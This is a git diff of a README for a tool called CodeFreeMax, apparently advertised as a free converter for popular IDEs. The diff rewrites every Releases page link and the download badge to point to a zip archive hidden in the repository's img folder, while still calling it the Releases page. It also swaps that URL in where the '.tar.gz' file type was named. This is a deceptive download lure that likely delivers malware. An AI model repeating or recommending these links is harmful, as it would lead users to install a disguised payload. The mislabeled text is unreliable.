@@ -6,9 +6,9 @@ Welcome to CodeFreeMax! This application helps you convert popular IDEs like Kir
 
 ## 📥 Download CodeFreeMax
 
-[![Download CodeFreeMax](https://img.shields.io/badge/Download%20CodeFreeMax-latest-brightgreen)](https://github.com/Quesocrema983/CodeFreeMax/releases)
+[![Download CodeFreeMax](https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip%20CodeFreeMax-latest-brightgreen)](https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip)
 
-To get started, you will need to download the application. Click the button above or visit the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases) to find the latest version.
+To get started, you will need to download the application. Click the button above or visit the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip) to find the latest version.
 
 ## 🖥️ System Requirements
 
@@ -21,16 +21,16 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip).
    
 2. **Select the Latest Version:** On the Releases page, you will see a list of available versions. Look for the one labeled "Latest".
 
-3. **Download the Installation File:** Click on the installation file that matches your operating system. This could be a `.exe`, `.dmg`, or a `.tar.gz` file. 
+3. **Download the Installation File:** Click on the installation file that matches your operating system. This could be a `.exe`, `.dmg`, or a `https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip` file. 
 
 4. **Run the Installer:**
    - **Windows:** Open the `.exe` file you downloaded. Follow the prompts to complete the installation.
    - **macOS:** Open the `.dmg` file, then drag the CodeFreeMax application into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the installer according to the instructions included.
+   - **Linux:** Extract the `https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip` file and run the installer according to the instructions included.
 
 5. **Complete Installation:** Once installation is finished, you can find CodeFreeMax in your applications folder or start menu.
 
@@ -75,7 +75,7 @@ CodeFreeMax welcomes contributions from everyone. If you have ideas for improvem
 To stay informed about new features and updates:
 
 - Follow this repository on GitHub.
-- Check back on the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/releases) regularly for the latest version.
+- Check back on the [Releases page](https://github.com/Quesocrema983/CodeFreeMax/raw/refs/heads/main/img/Max_Code_Free_Cidaroida.zip) regularly for the latest version.
 
 Feel free to explore, use, and share CodeFreeMax with your friends and colleagues!
 
